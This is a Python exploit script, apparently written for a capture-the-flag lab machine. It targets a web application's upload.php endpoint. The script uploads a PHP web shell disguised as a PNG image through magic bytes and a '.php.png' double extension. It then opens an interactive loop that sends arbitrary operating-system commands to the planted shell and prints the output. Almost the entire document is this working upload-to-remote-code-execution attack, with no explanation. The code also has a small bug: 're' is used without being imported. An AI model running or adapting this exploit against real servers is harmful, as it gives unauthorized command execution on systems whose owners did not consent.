#ToBeatElite
from re import findall
from sys import argv
import requests

def webshell(target_url, session):
    my_webshell = f"{target_url}upload/kamehameha.php"
    getcwd = {"telepathy": "echo %CD%"}
    r2 = session.get(my_webshell, params=getcwd, verify=False)

    if r2.status_code != 200: print(f"Failure Connection To Webshell : {r2.raise_for_status}")
    else: print("Sucsessfully Connected To Websell...")

    my_cwd = re.findall("[CDEF].*", r2.text)
    my_cwd = f"{my_cwd[0]}> "

    while True:
        imputed_text = input(my_cwd)
        command = {"telepathy": imputed_text}

        r2 = session.get(my_webshell, params=command, verify=False)
        if r2.status_code != 200: r2.raise_for_status()

        print(r2.text)

def main():
    try:
        print(f"Attempting To Create Session With {argv[1]}...")
        upload_url = f"{argv[1]}upload.php?id=kamehameha"
        my_session = requests.Session()
        my_session.get(argv[1], verify=False)
        print("Connected To Server...\nAttemting To Upload Malicious File...")
        PNG_magicBytes = '\x89\x50\x4e\x47\x0d\x0a\x1a'
        png     = {
                    'file': 
                      (
                        'kaio-ken.php.png', 
                        PNG_magicBytes+'\n'+'<?php echo shell_exec($_GET["telepathy"]); ?>', 
                        'image/png', 
                        {'Content-Disposition': 'form-data'}
                      ) 
                  }
        fdata   = {'pupload': 'upload'}
        my_session.post(url=upload_url, files=png, data=fdata, verify=False)
        print("File Uploaded...\nAttempting To Create WebShell...")
        webshell(argv[1], my_session)

    except Exception as ex: print(f"\nUsage : python {argv[0]} [target_url]\nExample : python {argv[0]} http://10.10.10.198:8080/\n{ex}")

if __name__ == "__main__": main()
